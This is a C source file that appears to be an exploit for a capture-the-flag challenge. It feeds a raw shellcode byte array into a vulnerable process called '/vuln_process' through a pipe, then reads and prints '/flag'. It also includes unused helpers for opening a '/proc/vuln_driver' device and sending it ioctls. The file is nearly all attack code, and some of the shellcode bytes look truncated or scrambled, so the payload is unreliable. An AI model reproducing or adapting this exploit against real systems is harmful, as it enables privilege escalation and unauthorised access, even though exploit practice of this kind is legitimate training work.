#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/ioctl.h>

char global_buf[1024];
char proc[] = "/proc/vuln_driver";
int global_fd;
const struct timespec nstime = { 0, 500000000 };

void ioctl_set_msg(int fd, char *msg) {
        ioctl(fd, 1337, msg);
        close(fd);
}

void open_proc() {
        global_fd = open(proc, O_RDWR);
        if (global_fd < 0) {
                printf("problem\n");
                exit(1);
        } else {
                printf("[+] device open\n");
        }
}

void read_flag() {
        int s;
        global_fd = open("/flag", O_RDONLY);
        s = read(global_fd, global_buf, sizeof(global_buf));
        close(global_fd);
        if (s < 0) {
                printf("problem read flag\n");
        } else {
                printf("%s\n", global_buf);
        }
}

void debug(uint8_t *inp, int size) {
        for (int i = 0; i < size; i++) {
                if (i % 8 == 0) {
                        if (i != 0) {
                                printf("  <--  %#08x\n", i);
                        }
                        printf("0x");
                }
                printf("%02x", inp[i]);
                if (i == (size - 1)) {
                        printf("  <--  %#08x", i);
                }
        }
        printf("\n");
}

void start_process(char* proc) {
        char *argp[] = { proc, NULL };
        char *arge[] = { NULL };
        execve(proc, argp, arge);
}

int main() {
        int pid;
        int pfd[2];
        uint8_t kernel_esc[] = { 0x48, 0xbb, 0xc0, 0x90, 0x8d, 0x8, 0x81, 0xff, 0xd0, 0xc3, 0x53, 0x48, 0xbb, 0x81, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x48, 0xc7, 0x53, 0x48, 0xbb, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0xd0, 0x90, 0x8, 0x53, 0x48, 0xc7, 0xc3, 0x48, 0x0, 0x0, 0x0, 0x53, 0x48, 0xc7, 0xc7, 0x3, 0x0, 0x0, 0x0, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0, 0x1, 0x0, 0x0, 0x0, 0xf, 0x5 };

        pipe(pfd);
        pid = fork();
        if (pid == 0) {
                close(pfd[1]);
                dup2(pfd[0], STDIN_FILENO);
                close(pfd[0]);
                start_process("/vuln_process");
                exit(0);
        } else {
                nanosleep(&nstime, NULL);
                close(pfd[0]);
                write(pfd[1], kernel_esc, sizeof(kernel_esc));
                close(pfd[1]);

                nanosleep(&nstime, NULL);
                nanosleep(&nstime, NULL);
                read_flag();
        }

        return 0;
}
